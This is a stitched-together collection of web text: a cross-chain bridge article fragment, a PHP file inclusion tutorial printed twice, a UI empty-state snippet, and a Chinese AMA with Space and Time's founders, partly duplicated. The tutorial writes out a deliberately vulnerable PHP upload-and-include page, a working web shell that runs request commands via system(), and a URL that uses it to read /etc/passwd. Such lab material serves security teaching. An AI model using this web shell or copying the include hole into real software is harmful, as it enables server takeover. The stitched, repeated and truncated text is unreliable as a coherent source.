built on Solana. The protocol bridges assets by locking users’ assets in smart contracts and minting new wrapped tokens on the destination chain.\n\\\n\n  \nWrapped tokens are tokens that have their value pegged to other cryptocurrencies that are native to other blockchains.\n\\\nAn example of a wrapped token is Wrapped Bitcoin (WBTC) - an ERC20 token on the Ethereum Blockchain. WBTC brings the ability to trade BTC on other blockchains like Ethereum and Solana. Wrapped tokens are one of the key elements that facilitate interoperability between blockchains.\n\\\nShamil discovered that while the Wormhole system has a healthy liquidity of tokens and is considered quite trustless with 19 validators, it faces a critical issue called the “recursive wrapping problem.”\n\\\nThe recursive wrapping problem arises when the target chain cannot distinguish the origin chain of a wrapped token. For example, if a user wraps USDC on Ethereum and Polygon, then wants to send them to Solana using Wormhole, the system would recognize them as two different tokens, naming them as “Ethereum Wrapped USDC” and “Polygon Wrapped USDC” correspondingly.\n\\\nMore details about the inner workings of Wormhole can be found in this video:\nhttps://www.youtube.com/embed/ngnWF5widJU?embedable=true\nMultichain’s Permissioned Wrapped Token Listing: An Alternative\nAccording to Shamil, one huge challenge faced by many cross-chain bridges is that most of the liquidity is locked on the Ethereum network and maintaining liquidity on Ethereum costs a lot in gas fees. \n\\\nHowever, Multichain solves this issue for some tokens with permissioned wrapped token listing where users have to fill in a google form to wrap a token. Users can transfer their wrapped tokens across different chains without interacting with Ethereum, thus helping save on gas fees.\n\\\nMore information about how Multichain works can be found in their documentation here.\nThe Liquidity Problem in Bridges\nOther issues Shamil brings to light are the scarcity of liquid-wrapped tokens as well as price discrepancies of the same token on different blockchains. The lack of wrapped token liquidity would result in much higher market volatility. \n\\\nLower liquidity levels would also make cross-chain bridges far more susceptible to market manipulations. \n\\\nIn contrast, high liquidity would mean a much more stable market. \n\\\nShamil provides the example of the collapse of the Terra stablecoin, UST, where users who had wrapped UST on Wormhole lost all their funds. \n\\\nCheck out this article for more details of what happened.\nHardron Network’s Collider Treasury\nAccording to Shamil, Hardron Network offers solutions to such scenarios with its “collider treasury” where bridging only occurs with liquid assets. \n\\\n\n  \nWhen a token’s value plunges to 0, users would lose only about 50% of their funds. \n\\\nThe Collider also uses a collider aggregation proxy to detect price discrepancies of the same token on different chains. \n\\\nSuppose there is a price difference of more than 2%. In that case, the Collider helps to align the markets by stabilizing the prices to prevent huge losses to liquidity providers during volatile market conditions.\n\\\nWith so many layer-1 and layer-2 blockchains being created and built upon, the conversation around the need for an interoperable future has never been more important. \n\\\nWhile there are still many challenges related to cross-chain bridges, work is being done by Shamil and Hardron Network to improve the interoperability of dApps across the different ecosystems while maintaining a high level of security.\n\\\nThe Blockchain Oracle Summit was the world’s first conference to focus solely on oracle security and design.

On form submission, the server executes the file we sent.</p><p>It’s easy, but before proceeding let’s create a directory called “uploads” by typing on the terminal:</p><pre>mkdir uploads</pre><p>Now we can execute our simple PHP server with the command:</p><pre>php -S 0.0.0.0:8000 -t .</pre><p>Finally, this is the result in our browser by typing http://&lt;TARGET_IP&gt;:8000</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/803/1*TLB8mWESmHwyWAoVZ3ysfA.jpeg\" /></figure><p>Now you can look for a backdoor or maybe create it by yourself, I’m going to use the one at this address, and this is the code:</p><pre>&lt;?php<br><br>if(isset($_REQUEST[&#39;cmd&#39;])){<br>        echo &quot;&lt;pre&gt;&quot;;<br>        $cmd = ($_REQUEST[&#39;cmd&#39;]);<br>        system($cmd);<br>        echo &quot;&lt;/pre&gt;&quot;;<br>        die;<br>}<br><br>?&gt;&lt;?php if(isset($_REQUEST[&#39;cmd&#39;])){ echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST[&#39;cmd&#39;]); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die; } ?&gt;</pre><p>So let’s upload it with the form, and after that, it’s inside the “uploads” folder, so we can execute cat or whatever we want by typing an URL like this:</p><p><a href=\"http://192.168.1.110:8000/?file=uploads/payload.php&amp;cmd=cat%20/etc/passwd\">http://192.168.1.110:8000/?file=uploads/payload.php&amp;cmd=cat%20/etc/passwd</a></p><p>In this case, it will prompt the content of /etc/passwd.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/786/1*KCs1_tbNJeBdWXGIFUD-sg.jpeg\" /></figure><p>It would be pretty easy to understand how to take advantage of that to take down the system totally.</p><h3>Conclusion</h3><p>In conclusion, file inclusion vulnerabilities are a serious threat to the security of web applications. These vulnerabilities allow attackers to include and execute arbitrary files on a target system, potentially gaining unauthorized access to sensitive data or compromising the system in other ways. As we have seen in the examples above, file inclusion vulnerabilities can be difficult to detect and protect against, making them a common target for hackers. Therefore, it is essential for organizations to take steps to secure their systems against file inclusion vulnerabilities and regularly monitor for potential attacks. By doing so, they can safeguard their systems and prevent costly and damaging breaches.</p><p>I hope you liked this introduction to file inclusion.

In this tutorial, I assume you are working on your Kali Machine, so you just need to install PHP by typing this in your terminal and then use the built-in server:\nsudo apt install php libapache2-mod-php\nNow you can create a file called “index.php” and write this code inside:\n<?php\n// include the file passed as GET parameter\nif (isset($_GET['file'])) {\n    include($_GET['file']);\n}\n// upload the file\nif (isset($_FILES['file'])) {\n    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);\n}\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\" integrity=\"sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\" crossorigin=\"anonymous\">\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"row\">\n            <div class=\"col-md-6\">\n                <form action=\"\" method=\"POST\" enctype=\"multipart/form-data\">\n                    <div class=\"form-group\">\n                        <label for=\"file\">Upload file</label>\n                        <input type=\"file\" class=\"form-control\" name=\"file\" id=\"file\">\n                    </div>\n                    <button type=\"submit\" class=\"btn btn-primary\">Submit</button>\n                </form>\n            </div>\n        </div>\n    </div>\n</body>\n</html>\nThis is a PHP script that:\n\nHandles file uploads\nIncludes a file if a GET parameter named file is set\nChecks if the file parameter is set in the $_GET superglobal array\nIf it is, the script will include the file specified by the parameter.\nNext, the script checks if a file has been uploaded via a POST request by checking if the file element is set in the $_FILES superglobal array\nIf a file has been uploaded, the script will move the uploaded file to the uploads/ directory and give it the original name of the uploaded file.\nThe script then outputs an HTML document with a file upload form.\n\nThe form uses the POST method and has the enctype attribute set to \"multipart/form-data\" to allow file uploads. On form submission, the server executes the file we sent.\nIt’s easy, but before proceeding let’s create a directory called “uploads” by typing on the terminal:\nmkdir uploads\nNow we can execute our simple PHP server with the command:\nphp -S 0.0.0.0:8000 -t .\nFinally, this is the result in our browser by typing http://<TARGET_IP>:8000\n\nNow you can look for a backdoor or maybe create it by yourself, I’m going to use the one at this address, and this is the code:\n<?php\nif(isset($_REQUEST['cmd'])){\n        echo \"<pre>\";\n        $cmd = ($_REQUEST['cmd']);\n        system($cmd);\n        echo \"</pre>\";\n        die;\n}\n?><?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; } ?>\nSo let’s upload it with the form, and after that, it’s inside the “uploads” folder, so we can execute cat or whatever we want by typing an URL like this:\nhttp://192.168.1.110:8000/?file=uploads/payload.php&cmd=cat%20/etc/passwd\nIn this case, it will prompt the content of /etc/passwd.\n\nIt would be pretty easy to understand how to take advantage of that to take down the system totally.\nConclusion\nIn conclusion, file inclusion vulnerabilities are a serious threat to the security of web applications. These vulnerabilities allow attackers to include and execute arbitrary files on a target system, potentially gaining unauthorized access to sensitive data or compromising the system in other ways. As we have seen in the examples above, file inclusion vulnerabilities can be difficult to detect and protect against, making them a common target for hackers. Therefore, it is essential for organizations to take steps to secure their systems against file inclusion vulnerabilities and regularly monitor for potential attacks. By doing so, they can safeguard their systems and prevent costly and damaging breaches.\nI hope you liked this introduction to file inclusion.

Empty states are often overlooked in UI design. When we design a product, we normally design for a populated interface where everything in the layout looks well arranged. However, it’s equally important to design pages on which the content is pending user action.</p><h4>1. Analyze user flow</h4><p>And the first thing that we need to do is to find places where users can face empty states. How to find such places? We need to analyze user flow.</p><iframe src=\"https://cdn.embedly.com/widgets/media.html?src=https%3A%2F%2Fwww.youtube.com%2Fembed%2F9rZj2cjcevw%3Ffeature%3Doembed&amp;display_name=YouTube&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D9rZj2cjcevw&amp;image=https%3A%2F%2Fi.ytimg.com%2Fvi%2F9rZj2cjcevw%2Fhqdefault.jpg&amp;key=a19fcc184b9711e1b4764040d3dc5c07&amp;type=text%2Fhtml&amp;schema=youtube\" width=\"854\" height=\"480\" frameborder=\"0\" scrolling=\"no\"><a href=\"https://medium.com/media/1713bf9b98936049045995ac338b6e29/href\">https://medium.com/media/1713bf9b98936049045995ac338b6e29/href</a></iframe><p>For example, when we design an eCommerce app, “No search results” is an excellent place for an empty state.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*n9m5aE3DRd5A7bQZtBDFpQ.png\" /><figcaption>User flow in the eCommerce app. Image by Nick Babich.</figcaption></figure><p>An empty state can show a quick update, “No results found,” along with a call to action, “Clear all filters.”</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*_0vxMuRYps6ZrHyhMcIkdA.png\" /><figcaption>No results page on Google Flights.</figcaption></figure><h4>2. Avoid creating dead-end pages</h4><p>Next, we need to avoid creating dead-end pages. The absolute worst thing we can do with an empty state is to drop our users into a dead-end. Dead-ends page don’t provide a next step, they confuse uesrs and make them leave a product.</p><p>Here are two examples of empty states. The first one is an ineffective empty state that provides no guidance — only a dead end. The second example reduces friction by helping the user start the task.

创意主管</strong></p>\n</li>\n</ul>\n<p>感谢所有参与的社区成员！</p>\n<p>特别是提出了问题的成员：Mystery Men、vAnt、S. Crypto、Monkey Boy、Joe_、ylxb、joao1dao、whiteshrekk、BlueReturns、AHacTasia、NFterraX 和 Spark I xifeng。</p>\n<p><strong>[<strong>会议开始</strong>]</strong></p>\n<p><code>Introduction</code></p>\n<p><strong>Scott:</strong> 让我们花点时间介绍一下自己，我是 Scott Dykstra，Space and Time 的联合创始人兼首席技术官，我们大约在一年半前开始了这个项目，我们聘请了 Spencer 作为第一个员工，这是我们的第一个员工。</p>\n<p><strong>Spencer:</strong> 那是排名，对吧？第一个员工？</p>\n<p><strong>Scott:</strong> 那是首席执行官，就在那里！</p>\n<p><strong>Spencer:</strong> 我是 Spartan-117，希望你们现在已经从 Discord 了解我了。如果你不知道，我是创意总监兼营销大师 Spencer Reeves，Mike Post 加入了我的行列；他是社区经理。他在 Discord 上组织一切，所以我知道你们都认识 Mike。</p>\n<p><code>AMA</code></p>\n<p><strong>团队目前来自哪里？团队目前有多少成员？</strong></p>\n<p>Scott：40 名工程师，总共 50 人，我们的工程师遍布美国各地，在印度还有一支优秀的团队，总部位于洛杉矶地区纽波特海滩。</p>\n<p><strong>Space and Time测试网什么时候上线？</strong></p>\n<p>Scott：我们的目标是明年第二季度初上线测试网，主网将在明年年底。这些是我们的目标，我将非常努力地实现这些目标。</p>\n<p><strong>想知道Space and Time的创意总监Spencer Reeves先生对未来这个项目有什么样的想法，比如社区或者合作伙伴关系？</strong></p>\n<p>Spencer：我们一直在非常努力地进行 Space and Time NFT drop，我们即将实现这一目标。我们将以非常游击队的方式发布它们，数量有限，而且很少见。</p>\n<p>我们还在 9 月底的 SmartCon（Chainlink 会议）上发布了一些重大公告，我们将与 Chainlink 和 Microsoft 一起成为主流，我们有一些令人兴奋的事情要说。</p>\n<p><strong>将项目命名为“Space and Time”的灵感是什么？</strong></p>\n<p>Scott：它只是来自数据库，我们正在构建一个去中心化的数据仓库，一个用于 Web3 的海量数据库，一个 Web3 原生的数据仓库。Space是存储量，可用于保存所有 Web3 数据的空间量，以及运行查询所需的时间，希望它很少，因为我们超快！</p>\n<p><strong>你如何将自己与 The Graph、Kyve、Ceramic 等区分开来？</strong></p>\n<p>Scott：TheGraph 本质上是通过区块链进行 RPC 调用，将 RPC 区块链数据塑造成一种关系格式，存储到 PostgreSQL（一个 Web2 数据库）中，然后用于查询。我认为 TheGraph 非常适合快速固定子图并找到您需要的 EVM 子集，但它不是数据仓库。您不能运行连接链上和链下数据的大规模查询，DApp 开发人员不能将自己的数据存储在 TheGraph 中，TheGraph 只是从区块链中获取数据并使其可查询。 Space and Time 也可以这样做，但规模要大得多，它允许客户在 Space and Time 中加入他们自己的数据，这是一个数据仓库，客户可以在其中构建他们想要的任何东西。</p>\n<p>Kyve 是一种数据归档服务，它将区块链，即链的历史记录到基于 IPFS 的服务中。</p>\n<p>Ceramic 更像是数据库，我应该说，Ceramic 将数据流式传输到基于 IPFS 的存储或去中心化存储中，我们在企业规模上做类似的工作。 Space and Time 是一个数据仓库——它不是一个单节点数据库，每个集群数十到数百 TB，全球部署了数百个集群。</p>\n<p>因此，从架构上来说《Space and Time》与这三者截然不同，而且用例不同。我们的用例是把世界上的商业逻辑带到网上，放在区块链上。</p>\n<p><strong>你在开发这个项目时遇到了哪些困难，你是如何克服的？</strong></p>\n<p>Scott：我们克服了很多技术困难才走到这一步，此外，我们在六个月内组建了一个团队——我们在六个月内从四个人增加到四十人。</p>\n<p>Spencer：就在 Scott 开始讨论这个问题之前，我认为人们往往会忘记，在运营方面，当你开始这些业务时——仅仅因为我们是 Web3 并不能使建立一个真正有效和有组织的团队变得更容易，这是我们非常兴奋做的事情之一，因为它自下而上地构建了公司。我们打下了真正让我们脚踏实地的基础。当然，我们很高兴继续致力于架构，但我会让Scott进入技术方面。</p>\n<p>Scott：我认为最难的部分是建立SQL证明，这是一个新颖的加密证明，让数据仓库实际证明查询结果，创建一个SNARK加密证明，数据仓库做什么，并将其连接到区块链，因此智能合约可以实际运行对Space and Time的查询。这是我们团队正在孵化的新的加密技术；我们的团队有大约10名密码学家在数据库内研究SNARK加密技术。其原因是，它允许Space and Time成为一个数据侧链，它允许 &quot;Space and Time &quot;将数据传输到主要的EVM链上。如果我们能把数据建立起来作为数据侧链，如果我们能把它建议到以太坊，那么我们可以把大量的链外数据连接到智能合约。想象一下，你可以运行一个智能合约，说：&quot;向我展示PancakeSwap上按TVL计算的前十大流动性池&quot; 现在，令人惊讶的是，你无法从一个智能合约中做到这一点，建立这种加密技术真的很难，这是一个漫长的旅程。</p>\n<p>Spencer：如果您在服务器上看到我们的Space and Time团队成员，请随时在频道中与他们联系，Mike 是您的 DM 首选，但随时可以在频道中与 Discord 中的团队成员打招呼！</p>\n<p><strong>在 Web2 中，有不同的数据架构：warehouses, lakes, mesh等，Web3 中是否也存在同样的情况？你为什么选择数据仓库？为什么把它带到 Web3？</strong></p>\n<p>Scott：这是我收到的最好的问题，所以支持你！这就是我在过去十年中所处的世界——我一直在为财富 500 强企业大规模构建数据仓库和数据湖。现在已经到了竞争如此激烈、营销和公关领域有如此多不同参与者的地步，尝试构建自己版本的数据湖、数据网格、数据结构，最终就是这种架构，您可以将大量数据加载到云存储中，如 Amazon S3 或 Azure Blob 存储，以及您使用将计算带到存储本身的计算查询引擎来使用它，您这样做的原因是因为您可以显着节省存储成本。您将数据加载到 S3 中，将您的查询引擎置于其之上——您的数据湖屋，或者他们现在所说的任何东西——然后您就可以使用它了。我们使用数据仓库的原因是因为 Web3 范式有很大不同。我们今天将 Space and Time 称为数据仓库，因为坦率地说，我们不确定如何称呼它，它不是 Web2 数据仓库，它是在同一个集群中的混合事务数据库和分析数据的仓库，我们构建的是一个混合解决方案，混合交易和分析平台在一起。</p>\n<p>由于规模，我们将其称为数据仓库。这是集群规模的计算，大型计算集群可以像数据仓库一样，在单个查询中处理十个表的连接和数百 TB 的数据。但是 Web2 的架构将在 Web3 中消亡，原因是因为工具有很大的不同，因为区块链，它本身就是一个数据库。区块链是一个交易数据库，它是一个事务性数据库，只有一个表，即分布式账本，它被多次去中心化并在如此多的节点和区块链上复制，以至于通过共识变得防篡改。区块链是一个单表数据库，但是是一个不可篡改的数据库，我们将其用于交易。</p>\n<p>Space and Time 是一个位于区块链旁边的数据仓库，可以存储更多数量级的数据，包括链上和链下数据。所以我们有区块链的关系副本，例如以太坊，我们在数据仓库中有客户的链下数据。我们真正在构建的，我们实际上正在考虑围绕这个稍微改变我们的消息——我喜欢你的意见——实际上是一个数据侧链。它实际上是一个侧链，位于 EVM 旁边，位于 Solana 旁边，位于 Flow 旁边，你给区块链命名，它处理这些区块链的所有链下数据，并将这些链下数据与主要链连接起来。</p>\n<p>Spencer：我们现在正在做的很多事情在技术上对消费者或企业来说是不可用的，所以它有点像这个灰色地带，我们可能不仅要想出自己的方式来描述什么我们正在做，但你知道，谁掌握着这一切的钥匙？我们可以这么说吗？谁知道？</p>\n<p>Scott：是的，我们是！我想当我们说“数据侧链”时，人们会扬起眉毛，然后我们会说，“哦，好吧，这是一个数据仓库！”它是！在架构上，我们正在构建数据仓库集群，这些集群部署在世界各地的去中心化网络中，但它们将数据汇总到主要链上。</p>\n<p><strong>强大的社区不仅能为项目带来有趣的想法，还能吸引更大的合作伙伴，那么 Space and Time 计划如何建设其社区？</strong></p>\n<p>Spencer：好问题：大型社区确实为项目带来了更好的想法并吸引了大型合作伙伴。因此，作为一家公司，您必须问自己“社区的用途是什么？”Scott和我，从一开始，我们就一直关注这种将社区附加到产品上的更大的想法，这就是为什么：因为我们希望尽可能多的想法涌入，我们想要很多使用我们产品的人，我们如何通过社区用户迭代来更好地应对这种技术挑战。就我们构建这个社区的方式而言：在后端，Mike和我孜孜不倦地致力于与我们稍后命名的其他大型项目建立联系，也通过我们正在进行的这个 NFT 项目，通过会议等。我们只想让你们参与到 Space and Time 舞台上的各个层面。</p>\n<p>Scott：是的，NFT空投，我们将在 Discord 上活跃，在 Twitter 上活跃，我们将与我们的合作伙伴做很多工作，围绕 Chainlink 社区构建，围绕 Framework 和 DCG 的其他社区构建，我们将围绕一些 Twitter 营销、公关做很多工作，最终，其中很多是在 Space and Time 之上构建非常酷的项目。我们正在孵化一些非常酷的东西：一些 AAA 游戏，一些我们自己的游戏，我们正在孵化一些令人惊讶的下一代 DeFi 项目，当人们意识到这一切都是由 Space and Time 运行和驱动时，我认为这将激起人们对该领域的真正兴趣，社区建设艰巨！</p>\n<p>Spencer：是的，我无法强调你们实际上对这一点有多早。在SmartCon之后，我们将发布一些非常惊人的公告，所以我希望到那时我们的社区增长更多，但我不能强调你们实际上是多么的早，我们对你们所有人的到来感到兴奋!</p>\n<p><strong>我知道这个问题可能很烦人，因为你经常被问到，但是你能从代币中看到什么优势吗？</strong></p>\n<p>Scott：我认为代币的最大优势是：A）它获得了更大的社区； B）它允许人们更容易地激励去中心化网络。Space and Time 是一个由全球数百个数据仓库集群组成的去中心化网络，这些集群由社区运营，归社区所有，由用户部署，而Space and Time代币作为实用代币，将激励这些集群。否则，我们需要用 USDC，也许是 ETH，也许是 LINK 来激励他们，感觉就像在去中心化网络中使用中心化激励。另外，令牌很棒！这有点像，在 Web3 中的全部意义。为什么要构建如此复杂、如此强大的支持、如此庞大的团队、真正去中心化、真正无需信任的网络，却没有代币？</p>\n<p>现在，我这么说，而且，市场现在也有点变化无常，所以我们不急于发布代币。</p>\n<p><strong>具体有哪些方式可以保证数据不被篡改？</strong></p>\n<p>Scott：好问题；我们确保通过共识服务以加密方式保证摄入Space and Time的数据。我们多次冗余地将数据摄取到Space and Time中，并就此达成共识，就像 Chainlink 从多个不同的数据馈送中摄取数据并达成共识，然后再将这些数据馈送的结果写入智能合约或在链上创建数据馈送的链。因此，我们可以通过密码学保证将数据摄取到Space and Time中。然后，我们有存储证明，我们可以用密码学证明数据存在于Space and Time中，最后，我们的大部分工作是 SQL 证明，这是我们团队的一种新颖的、全新的密码证明为数据库、数据仓库而构建，以实际证明查询结果是准确的、未被篡改的、在链上得到加密保证的。 SQL 证明为 SQL 生成密码学证明 SNARK，然后可以将其证明给智能合约，SQL 的 SNARK 可以发送到智能合约，因此，这证明了查询执行，证明了存储，并且证明了数据来自可行的来源。</p>\n<p><strong>此时社区如何才能最好地支持该项目并增加价值？</strong></p>\n<p>Spencer：好问题；我认为首先是传播信息。在产品的这个早期阶段，当你们在 Twitter 上传播信息、在我们的 Discord 和 Telegram 中结交朋友时，这非常有帮助。我们正在努力建立这些社区，我们正在努力提高这些数字并让每个人都了解Space and Time，以便我们能够真正向未来的客户、合作伙伴以及你们社区证明我们自己，因此，这将是增加价值的最佳方式。</p>\n<p><strong>在项目的这一点上，您认为 Space and Time 在 Web3 中的主要用例是什么？ GameFi、DeFi？</strong></p>\n<p>Spencer：我会让 CTO [Scott] 更全面地回答用例问题，但肯定是 GameFi。我们绝对沉迷于 Web3 游戏和一般游戏。 Scott 和我一直都是游戏玩家，我们非常喜欢玩游戏，所以我们希望在 GameFi 中占有一席之地。能够将链下和链上数据连接到游戏是非常重要的。它只会让游戏变得更好，尤其是在区块链世界中，所以我们非常高兴能够解决 GameFi 问题。</p>\n<p>Scott：我们现在与一系列 AAA 区块链游戏合作，这些游戏将在今年年底或明年初推出，他们正在构建 Space and Time 作为他们的数据仓库来支持他们的 in-游戏数据并将他们的游戏内数据与他们所有的链上数据结合起来。在 DeFi 方面，我们正在与许多 DeFi 协议合作，进行互换、链上衍生品等链上期权。他们正在使用 Space and Time 来帮助分散他们的整个数据堆栈，这些数据为他们的 DeFi 协议提供支持。</p>\n<p><strong>你好，团队！您已于 2022 年 7 月 28 日成功验证了 1000 万美元的种子轮融资，下一轮融资计划何时进行？</strong></p>\n<p>Scott：孩子，我们有好消息要告诉你吗！我们在月底的 Chainlink 会议 SmartCon 上发布了一些公告，我们将宣布一些有趣、令人兴奋的事情。</p>\n<p>Spencer：就像，大新闻，伙计们！我为我们的社区成长感到非常兴奋，我们会吸引很多目光。因此，请围绕 SmartCon 做好准备，欢迎这么多新人加入我们的社区。我们将在 9 月 28 日发布重大公告，所以当社区的新成员开始出现时，请张开双臂欢迎他们！现在社区的所有成员都像核心小组，这是第一个 Discord 直播！你们是 OG——Scott 和我会永远记住你们。</p>\n<p><strong>现在还有其他项目在使用 Space and Time 吗？</strong></p>\n<p>Scott：是的！就在一分钟前，我们还在谈论基本上已经在 Space and Time 上运行的 DeFi 和游戏项目，一堆 AAA 游戏和创建选项的平台。我们甚至还没有推出！我们甚至还没有推出我们的 alpha 版。我们计划在今年年底左右推出我们的 alpha，我们已经有许多 DeFi 和游戏项目在我们身上运行，我们已经安排了大约一百个项目，它们希望在第一季度开始在 Space and Time 上运行。</p>\n<p>Spencer：我们在网站 (<a href=\"http://www.spaceandtime.io\">http://www.spaceandtime.io</a>) 上有一份完整的合作伙伴名单和支持者名单，如果你们现在想更深入地了解谁在支持我们并与我们合作。</p>\n<p><strong>Space and Time 会首先在 Ethereum 或 Polygon 推出吗？</strong></p>\n<p>Scott：实际上，两者都有！我们与 EVM 兼容，因此我们支持任何主要的 EVM 链。所以 Space and Time 支持 Ethereum、Polygon、Avalanche 和 Binance，我们很快就会支持 Solana 和 Flow。</p>\n<p><strong>这个项目会超越 Web3 吗？这在 Web2 数据空间中会有什么样的应用？</strong></p>\n<p>Scott：我们正在与一群正在进入 Web3 领域的 Web2 企业交谈。这太令人兴奋了！尽管我很喜欢 DeFi，也很喜欢游戏，但当我看到 Web2 企业进入 Web3 领域时，我真的很兴奋，因为那是巨大的繁荣，这就是我们都在等待的浪潮。我们已经看到了 DeFi summer，我们已经知道游戏浪潮要来了，我们现在正在与这么多 AAA 区块链游戏合作，即将推出的 AAA 游戏，所以我知道2023 年将迎来一波巨大的游戏浪潮，但我还没有看到一波企业浪潮。 Space and Time 的定位是将这些企业真正带入区块链。所以现在我们正在与许多想要使用区块链但拥有大量数据的财富 500 强公司交谈，他们需要Space and Time作为一个无需信任的桥梁，将他们的数据从他们的集中式系统转移到他们的分散式系统中系统。</p>\n<p><strong>总结：</strong></p>\n<p>Scott：谢谢大家的加入！我们很快就会再次这样做！回答你所有的问题真是太棒了。</p>\n<p>Spencer：另外，我们要确保为这些活动容纳尽可能多的人，我们将尝试在不同时间进行这些活动，以适应世界各地社区中的每个人。</p>\n<p>Scott：我们很快就会再做一次！我们将与您一起回答更多问题，我们会更多地参与其中！</p>\n<p>Spencer：非常感谢你的出现！我们非常感谢你们所有人的加入。很高兴再次这样做！ </p>\n<p> Scott：支持数据侧链！</p>\n<p>Mike：我要感谢所有出现的人！如果您能在 Twitter、Telegram 和 LinkedIn 上查看我们，我们将不胜感激，所有链接都在服务器上的链接通道中。我们总是乐于听取您的意见，所以如果您有任何建议、对未来内容的想法或任何类似的事情，您可以随时将其发布在建议频道或直接私信我。如果您有任何疑问，请不要害羞与我联系！我来这里是为了给你任何你正在寻找的信息，并让你参与这个令人惊叹的项目，即Space and Time。正如 Spencer 和 Scott

drop，我们即将实现这一目标。我们将以非常游击队的方式发布它们，数量有限，而且很少见。\n我们还在 9 月底的 SmartCon（Chainlink 会议）上发布了一些重大公告，我们将与 Chainlink 和 Microsoft 一起成为主流，我们有一些令人兴奋的事情要说。\n将项目命名为“Space and Time”的灵感是什么？\nScott：它只是来自数据库，我们正在构建一个去中心化的数据仓库，一个用于 Web3 的海量数据库，一个 Web3 原生的数据仓库。Space是存储量，可用于保存所有 Web3 数据的空间量，以及运行查询所需的时间，希望它很少，因为我们超快！\n你如何将自己与 The Graph、Kyve、Ceramic 等区分开来？\nScott：TheGraph 本质上是通过区块链进行 RPC 调用，将 RPC 区块链数据塑造成一种关系格式，存储到 PostgreSQL（一个 Web2 数据库）中，然后用于查询。我认为 TheGraph 非常适合快速固定子图并找到您需要的 EVM 子集，但它不是数据仓库。您不能运行连接链上和链下数据的大规模查询，DApp 开发人员不能将自己的数据存储在 TheGraph 中，TheGraph 只是从区块链中获取数据并使其可查询。 Space and Time 也可以这样做，但规模要大得多，它允许客户在 Space and Time 中加入他们自己的数据，这是一个数据仓库，客户可以在其中构建他们想要的任何东西。\nKyve 是一种数据归档服务，它将区块链，即链的历史记录到基于 IPFS 的服务中。\nCeramic 更像是数据库，我应该说，Ceramic 将数据流式传输到基于 IPFS 的存储或去中心化存储中，我们在企业规模上做类似的工作。 Space and Time 是一个数据仓库——它不是一个单节点数据库，每个集群数十到数百 TB，全球部署了数百个集群。\n因此，从架构上来说《Space and Time》与这三者截然不同，而且用例不同。我们的用例是把世界上的商业逻辑带到网上，放在区块链上。\n你在开发这个项目时遇到了哪些困难，你是如何克服的？\nScott：我们克服了很多技术困难才走到这一步，此外，我们在六个月内组建了一个团队——我们在六个月内从四个人增加到四十人。\nSpencer：就在 Scott 开始讨论这个问题之前，我认为人们往往会忘记，在运营方面，当你开始这些业务时——仅仅因为我们是 Web3 并不能使建立一个真正有效和有组织的团队变得更容易，这是我们非常兴奋做的事情之一，因为它自下而上地构建了公司。我们打下了真正让我们脚踏实地的基础。当然，我们很高兴继续致力于架构，但我会让Scott进入技术方面。\nScott：我认为最难的部分是建立SQL证明，这是一个新颖的加密证明，让数据仓库实际证明查询结果，创建一个SNARK加密证明，数据仓库做什么，并将其连接到区块链，因此智能合约可以实际运行对Space and Time的查询。这是我们团队正在孵化的新的加密技术；我们的团队有大约10名密码学家在数据库内研究SNARK加密技术。其原因是，它允许Space and Time成为一个数据侧链，它允许 \"Space and Time \"将数据传输到主要的EVM链上。如果我们能把数据建立起来作为数据侧链，如果我们能把它建议到以太坊，那么我们可以把大量的链外数据连接到智能合约。想象一下，你可以运行一个智能合约，说：\"向我展示PancakeSwap上按TVL计算的前十大流动性池\" 现在，令人惊讶的是，你无法从一个智能合约中做到这一点，建立这种加密技术真的很难，这是一个漫长的旅程。\nSpencer：如果您在服务器上看到我们的Space and Time团队成员，请随时在频道中与他们联系，Mike 是您的 DM 首选，但随时可以在频道中与 Discord 中的团队成员打招呼！\n在 Web2 中，有不同的数据架构：warehouses, lakes, mesh等，Web3 中是否也存在同样的情况？你为什么选择数据仓库？为什么把它带到 Web3？\nScott：这是我收到的最好的问题，所以支持你！这就是我在过去十年中所处的世界——我一直在为财富 500 强企业大规模构建数据仓库和数据湖。现在已经到了竞争如此激烈、营销和公关领域有如此多不同参与者的地步，尝试构建自己版本的数据湖、数据网格、数据结构，最终就是这种架构，您可以将大量数据加载到云存储中，如 Amazon S3 或 Azure Blob 存储，以及您使用将计算带到存储本身的计算查询引擎来使用它，您这样做的原因是因为您可以显着节省存储成本。您将数据加载到 S3 中，将您的查询引擎置于其之上——您的数据湖屋，或者他们现在所说的任何东西——然后您就可以使用它了。我们使用数据仓库的原因是因为 Web3 范式有很大不同。我们今天将 Space and Time 称为数据仓库，因为坦率地说，我们不确定如何称呼它，它不是 Web2 数据仓库，它是在同一个集群中的混合事务数据库和分析数据的仓库，我们构建的是一个混合解决方案，混合交易和分析平台在一起。\n由于规模，我们将其称为数据仓库。这是集群规模的计算，大型计算集群可以像数据仓库一样，在单个查询中处理十个表的连接和数百 TB 的数据。但是 Web2 的架构将在 Web3 中消亡，原因是因为工具有很大的不同，因为区块链，它本身就是一个数据库。区块链是一个交易数据库，它是一个事务性数据库，只有一个表，即分布式账本，它被多次去中心化并在如此多的节点和区块链上复制，以至于通过共识变得防篡改。区块链是一个单表数据库，但是是一个不可篡改的数据库，我们将其用于交易。\nSpace and Time 